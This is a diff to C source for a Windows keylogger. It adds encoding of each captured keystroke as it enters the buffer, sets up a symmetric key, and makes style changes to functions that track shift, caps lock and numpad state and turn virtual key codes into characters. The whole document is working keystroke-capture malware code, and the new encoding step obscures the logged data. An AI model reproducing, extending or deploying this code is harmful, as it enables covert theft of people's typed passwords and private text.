@@ -6,15 +6,21 @@
 
 KEY_LOGGER* initKeyLogger() {
     KEY_LOGGER* kLogger = malloc(sizeof(KEY_LOGGER));
-    if (kLogger == NULL) return NULL;
+    if (kLogger == NULL) { return NULL; }
+
+    // set all the key pairs to NULL
+    for (int i = 0; i < NUM_KEYS; i++) {
+        kLogger->keyCodes[i] = NULL;
+    }
 
     kLogger->shift = FALSE;
     kLogger->capsLock = FALSE;
     kLogger->numPad = FALSE;
+
+    kLogger->keyBuffer[0] = '\0';
     kLogger->bufferPtr = 0;  // set the buffer pointer to the start
-    
-    for (int i = 0; i < NUM_KEYS; i++) // set all the keycodes to NULL
-        kLogger->keyCodes[i] = NULL;
+
+    kLogger->encKey = ENC_KEY;  // init symmetric encoding key
     
     createKeyPairs(kLogger);
     return kLogger;
@@ -25,8 +31,9 @@ KEY_LOGGER* initKeyLogger() {
  * the keylogger itself
  */
 void keyLoggerCleanup(KEY_LOGGER* kLogger) {
-    for (int i = 0; i < NUM_KEYS; i++)
+    for (int i = 0; i < NUM_KEYS; i++) {
         cleanupKeyPair(kLogger->keyCodes[i]); // free key pair structs
+    }
     free(kLogger);
 }
 
@@ -38,16 +45,18 @@ void keyLoggerCleanup(KEY_LOGGER* kLogger) {
 BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
     // shift has been pressed so update it
     if (*vkCode == VK_SHIFT || *vkCode == VK_LSHIFT || *vkCode == VK_RSHIFT) {
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
-            kLogger->shift = TRUE;  // if its key-down shift state it true 
-        else
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            kLogger->shift = TRUE;  // if its key-down shift state it true
+        } else {
             kLogger->shift = FALSE; // on release set to false
+        }
         return TRUE;
     }
     // if its not key down we don't need to check, we now only 
     // care for key down capslock and numlock
-    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
         return FALSE;
+    }
     
     if (*vkCode == VK_CAPITAL) {
         swapBOOL(&kLogger->capsLock);
@@ -62,13 +71,17 @@ BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
 
 ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     KEY_PAIR* kp = kLogger->keyCodes[*vkCode];
-    
-    if (kp == NULL) return ECODE_NULL;
-    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) return ECODE_FULL_BUFF;
+    if (kp == NULL) { return ECODE_NULL; }
+    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) { return ECODE_FULL_BUFF; }
 
-    // if the key is unprintable then it should be appended to the buffer immediately
+    int encStart = kLogger->bufferPtr;  // number of bytes from the keyBuffer base pointer
+    char* encodeStrPtr = kLogger->keyBuffer + encStart;
+    
     if (isKeyUnprintable(kp)) {
+        // write unprintable string to buffer
         ERR_CODE ret = writeStrToBuffer(kLogger, kp->unprintableKeyStr);
+        // we only want to encode the content that has been added!
+        encode(encodeStrPtr, &kLogger->encKey);
         return ret;
     }
     
@@ -76,6 +89,7 @@ ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     char ch = getKeyChar(kLogger, kp, vkCode);
     kLogger->keyBuffer[kLogger->bufferPtr++] = ch;
     kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
+    encode(encodeStrPtr, &kLogger->encKey); // this will only encode the single char
 
     return ECODE_SUCCESS;
 }
@@ -89,17 +103,19 @@ ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
  */
 char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
     if (*vkCode >= A && *vkCode <= Z) {
-        if (kLogger->capsLock || kLogger->shift) 
+        if (kLogger->capsLock || kLogger->shift) { 
             return kp->onShift;
+        }
         return kp->normal;
     }
 
-    if (kLogger->shift)   // special case 1
-        return kp->onShift;
-    else if (kLogger->numPad && (*vkCode >= VK_NUMPAD0 && *vkCode <= VK_NUMPAD9))  // sepcial case 2
-        return kp->normal;
-    else
-        return kp->normal;
+    if (kLogger->shift) {
+        return kp->onShift; // special case 1
+    } else if (kLogger->numPad && (*vkCode >= VK_NUMPAD0 && *vkCode <= VK_NUMPAD9)) {
+        return kp->normal;  // sepcial case 2
+    }  else {
+        return kp->normal; 
+    }
 }
 
 /**
@@ -117,9 +133,9 @@ ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
     kLogger->keyBuffer[kLogger->bufferPtr] = '\0';
 
     // if we have hit the end of the buffer return full buff error!
-    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) 
+    if (kLogger->bufferPtr == MAX_BUFF_LEN - 1) {
         return ECODE_FULL_BUFF;
-
+    }
     return ECODE_SUCCESS;
 }
 
@@ -130,9 +146,10 @@ ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
 void createKeyPairs(KEY_LOGGER* kLogger) {
     // initialise numpad values
     const char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
-    for (int i = 0; i <= 9; i++)
+    for (int i = 0; i <= 9; i++) {
         kLogger->keyCodes[i + VK_NUMPAD0] = initKeyPair(digits[i], '\0', NULL);
-
+    }
+    
     // initialise letter array
     for (int upperLetter = A; upperLetter <= Z; upperLetter++) {
         char lowerLetter = upperLetter + 0x20; // get lowercase
